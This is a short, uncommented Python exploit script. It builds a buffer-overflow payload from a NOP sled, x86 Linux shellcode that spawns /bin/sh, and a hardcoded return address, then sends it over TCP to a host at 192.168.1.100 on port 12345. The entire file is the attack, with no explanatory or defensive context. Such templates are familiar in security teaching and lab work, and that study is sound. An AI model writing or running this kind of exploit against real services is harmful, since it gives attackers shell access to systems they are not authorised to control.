import socket
import struct

target_ip="192.168.1.100"
target_port=12345

nop_sled = b"\x90" * 100
shellcode =b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
return_address= struct.pack("<I",0xbfffffff)
payload= nop_sled + shellcode + return_address
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(payload)
s.close()
